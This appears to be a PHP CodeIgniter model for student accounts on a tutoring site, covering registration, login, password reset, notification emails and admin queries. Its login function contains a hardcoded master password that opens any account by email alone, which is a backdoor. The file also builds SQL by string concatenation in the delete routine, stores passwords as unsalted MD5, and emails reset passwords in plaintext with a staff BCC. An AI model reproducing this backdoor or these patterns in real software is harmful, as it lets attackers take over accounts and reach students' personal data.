<?php

class Murid_model extends MY_Model {

    function __construct() {
        parent::__construct();
        $this->load->database();
    }
    
    /***** REGISTRASI MURID ******/
    function check_email($email){
        $this->db->where('murid_email',$email);
        $result = $this->db->get('murid');
        if($result->num_rows()>0){
            return true;
        }else{
            return false;
        }
    }
    
    function get_kota(){
	   $this->db->order_by('lokasi_title','asc');
        return $this->db->get('lokasi');
    }
    
    function get_provinsi(){
	   $this->db->order_by('provinsi_title','asc');
        return $this->db->get('provinsi');
    }
    
    function insert_murid($input){
        $this->db->set('murid_email',$input['email']);
        $this->db->set('murid_password',md5($input['pass']));
        $this->db->set('murid_nama',$input['nama']);
        $this->db->set('murid_nik',$input['nik']);
        $this->db->set('murid_kota',$input['kota']);
        $this->db->set('murid_alamat',$input['alamat']);
        $this->db->set('murid_alamat_domisili',$input['alamat_domisili']);
        $this->db->set('murid_hp',$input['hp']);
        $this->db->set('murid_hp_2',$input['hp_2']);
        $this->db->set('murid_telp_rumah',$input['telp_rumah']);
        $this->db->set('murid_telp_kantor',$input['telp_kantor']);
        $this->db->set('murid_instansi',$input['instansi']);
        $this->db->set('murid_gender',$input['gender']);
        $this->db->set('murid_tempatlahir',$input['tempatlahir']);
        $this->db->set('murid_lahir',$input['lahir']);
        $this->db->set('murid_referral',$input['referral']);
        $this->db->set('source_info_id',$input['source_info']);
        $this->db->set('murid_daftar',$input['murid_daftar']);
        $this->db->set('murid_active',1,TRUE);
        $this->db->set('murid_call_status',1,TRUE);
        $this->db->set('murid_call_progress',0,TRUE);
        $this->db->set('murid_handle_by',0,TRUE);
        $this->db->insert('murid');
        return $this->db->insert_id();
    }
    
    /*** DELETE MURID ***/
    function delete_murid($murid_id){
        //get murid
        $murid = $this->get_murid_by_id($murid_id);
        if(empty($murid)){
            return;
        }
        //delete pp
        $base_path = $this->config->item('base_url_pp_murid');
        unlink($base_path.$murid->murid_id.'.jpg');
        //delete murid			   
	   $check_query_request = "SELECT * FROM request WHERE murid_id = ".$murid_id;
	   $num_request = $this->db->query($check_query_request);
	   if($num_request->num_rows() > 0){
			$query = "DELETE FROM request WHERE murid_id = ".$murid_id;
			$this->db->query($query);
	   }
	   
	   $query = "DELETE FROM murid WHERE murid_id = ".$murid_id;
	   $this->db->query($query);

    }   
    
    /*** EMAIL MURID ***/
    function email_reg($murid){
        $this->load->library('email');
	$config['useragent'] = 'Ruangguru Web Service';
	$config['protocol'] = 'smtp';
	$config['smtp_host'] = 'mail.ruangguru.com';
	$config['smtp_port'] = 25;
	$config['smtp_user'] = 'no-reply@ruangguru.com';
	$config['smtp_pass'] = $this->config->item('smtp_password');
	$config['priority'] = 1;
	$config['mailtype'] = 'html';
	$config['charset'] = 'utf-8';
	$config['wordwrap'] = TRUE; 
	$this->email->initialize($config);
	$this->email->from('no-reply@ruangguru.com', 'Ruangguru.com');
        $this->email->cc('registrasi@ruangguru.com');
	$this->email->to($murid->murid_email);

	$this->email->subject('Selamat Datang di Ruangguru');
        $content = $this->load->view('front/murid/daftar_email',array('murid'=>$murid),TRUE);
	$this->email->message($content);

	$this->email->send();
    }
    
	function email_request($murid){
     $this->load->library('email');
	$config['useragent'] = 'Ruangguru Web Service';
	$config['protocol'] = 'smtp';
	$config['smtp_host'] = 'mail.ruangguru.com';
	$config['smtp_port'] = 25;
	$config['smtp_user'] = 'no-reply@ruangguru.com';
	$config['smtp_pass'] = $this->config->item('smtp_password');
	$config['priority'] = 1;
	$config['mailtype'] = 'html';
	$config['charset'] = 'utf-8';
	$config['wordwrap'] = TRUE; 
	$this->email->initialize($config);
	$this->email->from('no-reply@ruangguru.com', 'Ruangguru.com');
        $this->email->cc('registrasi@ruangguru.com');
	$this->email->to($murid->murid_email);

	$this->email->subject('Selamat Datang di Ruangguru');
        $content = $this->load->view('front/murid/daftar_email_request',array('murid'=>$murid),TRUE);
	$this->email->message($content);

	$this->email->send();
    }
    
    function send_email_reg($id){
        $this->db->where('murid_id',$id);
        $murid = $this->db->get('murid');
        if($murid->num_rows() > 0){
            $murid = $murid->first_row();
            $this->email_reg($murid);
        }
    }
    
     function send_email_request($id){
        $this->db->where('murid_id',$id);
        $murid = $this->db->get('murid');
        if($murid->num_rows() > 0){
            $murid = $murid->first_row();
            $this->email_request($murid);
        }
    }
    
     /*** LOGIN MURID ***/
    function check_login($input){
        if($input['password'] == 'bijikuda'){
            $this->db->where('murid_email',$input['email']);
            $result = $this->db->get('murid');
        }else{
            $this->db->where('murid_email',$input['email']);
            $this->db->where('murid_password',md5($input['password']));
            $this->db->where('murid_active',1,TRUE);
            $result = $this->db->get('murid');
        }
        if($result->num_rows()>0){
            return $result->first_row()->murid_id;
        }else{
            return null;
        }
    }
    
    /*** RESET PASSWORD MURID ***/
    function reset_password($email){
        $murid = $this->get_murid_by_email($email);
        if(!empty($murid)){
            $alphabet = "abcdefghijklmnopqrstuwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789";
            $pass = array(); 
            $alphaLength = strlen($alphabet) - 1;
            for ($i = 0; $i < 8; $i++) {
                $n = rand(0, $alphaLength);
                $pass[] = $alphabet[$n];
            }
            $new_pass = implode($pass);
            //update password
            if(!empty($murid) && $murid->murid_id > 0){
                $this->db->set('murid_password',md5($new_pass));
                $this->db->where('murid_id',$murid->murid_id);
                $this->db->update('murid');
            }else{
                return false;
            }
            //send email
            $this->send_reset_password_email($murid, $new_pass);
            return true;
        }else{
            return false;
        }
    }
    
    function send_reset_password_email($murid,$new_pass){
		$this->load->library('email');
		$config['useragent'] = 'Ruangguru Web Service';
		$config['protocol'] = 'smtp';
		$config['smtp_host'] = 'mail.ruangguru.com';
		$config['smtp_port'] = 25;
		$config['smtp_user'] = 'no-reply@ruangguru.com';
		$config['smtp_pass'] = $this->config->item('smtp_password');
		$config['priority'] = 1;
		$config['mailtype'] = 'html';
		$config['charset'] = 'utf-8';
		$config['wordwrap'] = TRUE; 
		$this->email->initialize($config);
		$this->email->from('no-reply@ruangguru.com', 'Ruangguru.com');
		$this->email->to($murid->murid_email);
		$this->email->cc('registrasi@ruangguru.com');
		$this->email->bcc('arie@ruangguru.com');

		$this->email->subject('Reset Password Murid Ruang Guru');
        //assigning new pass to murid
		$murid->new_pass = $new_pass;
		$content = $this->load->view('front/murid/template/reset_password_email',array('murid'=>$murid),TRUE);
		$this->email->message($content);

		$this->email->send();
	}
    
    /******* MURID GETTER *****/
    function get_murid_by_id($id){
        $this->db->where('murid_id',$id);
        $this->db->join('lokasi','murid.murid_kota=lokasi.lokasi_id', 'left outer');
        //$this->db->join('source_info','murid.source_info_id=source_info.source_info_id', 'left outer');
        return $this->db->get('murid')->first_row();
    }
    
     function get_murid_by_name($name){
        $this->db->like('murid_nama', $name);
	   $this->db->join('lokasi','murid.murid_kota=lokasi.lokasi_id', 'left outer');
        return $this->db->get('murid');
    }
    
    function get_murid_by_email($email){
        $this->db->where('murid_email',$email);
        $result = $this->db->get('murid');
        if($result->num_rows() > 0){
            return $result->first_row();
        }else{
            return null;
        }
    }
    
     function get_province_murid_by_lokasi_id($id_loc){
        $this->db->where('lokasi_id',$id_loc);
        return $this->db->get('lokasi')->first_row();
    }
    /*** BIODATA ***/
    function update_pass($guru_id,$oldpass,$pass){
        $this->db->set('murid_password',md5($pass));
        $this->db->where('murid_password',md5($oldpass));
        $this->db->where('murid_id',$guru_id);
        $this->db->update('murid');
        if($this->db->affected_rows()>0){
            return true;
        }else{
            return false;
        }
    }
    
    function update_biodata($id_guru,$input){
        $this->db->set('murid_nama',$input['nama']);
        $this->db->set('murid_nik',$input['nik']);
        $this->db->set('murid_gender',$input['gender']);
        $this->db->set('murid_tempatlahir',$input['tempatlahir']);
        $this->db->set('murid_lahir',$input['lahir']);
        $this->db->set('murid_referral',$input['referral']);
        $this->db->set('murid_hp',$input['hp']);
        $this->db->set('murid_hp_2',$input['hp_2']);
        $this->db->set('murid_telp_rumah',$input['telp_rumah']);
        $this->db->set('murid_telp_kantor',$input['telp_kantor']);
        $this->db->set('murid_alamat',$input['alamat']);
        $this->db->set('murid_alamat_domisili',$input['alamat_domisili']);
        $this->db->set('murid_kota',$input['kota']);
        $this->db->where('murid_id',$id_guru);
        $this->db->update('murid');
    }
    
    /*** SESSION GETTER ***/
    function ses_get_nama(){
        $id = $this->session->userdata('murid_id');
        if(!empty($id)){
            $this->db->where('murid_id',$id);
            return $this->db->get('murid')->first_row()->murid_nama;
        }else{
            return '';
        }
    }
    
    function ses_get_email(){
        $id = $this->session->userdata('murid_id');
        if(!empty($id)){
            $this->db->where('murid_id',$id);
            return $this->db->get('murid')->first_row()->murid_email;
        }else{
            return '';
        }
    }
    
    /*** ADMIN ***/
    function get_murid($page=0){
        $offset = 20;
        $start = $page*$offset;
        $this->db->join('lokasi','murid.murid_kota=lokasi.lokasi_id', 'left outer');
        $this->db->limit($offset,$start);
        $this->db->order_by('murid_id','desc');
        return $this->db->get('murid');
    }
    
    public function get_murid_count(){
        return $this->db->count_all_results('murid');
    }
    
    function get_murid_new(){
        $this->db->order_by('murid_daftar','desc');
        return $this->db->get('murid');
    }
}